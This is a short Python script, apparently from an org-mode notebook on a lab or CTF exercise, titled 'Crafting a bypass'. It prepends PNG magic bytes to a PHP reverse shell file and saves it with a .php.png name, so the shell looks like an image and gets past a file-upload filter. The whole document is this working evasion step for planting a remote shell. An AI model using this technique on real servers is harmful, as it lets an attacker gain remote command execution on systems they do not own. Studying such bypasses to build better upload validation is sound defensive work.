# [[file:Magic.org::*Crafting a bypass][Crafting a bypass:3]]
#!/usr/bin/env python3

magic = bytearray([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])

with open("php-reverse-shell.php", "rb") as h:
    content = h.read()

with open("reverse-shell.php.png", "wb") as h:
    h.write(magic + content)
# Crafting a bypass:3 ends here
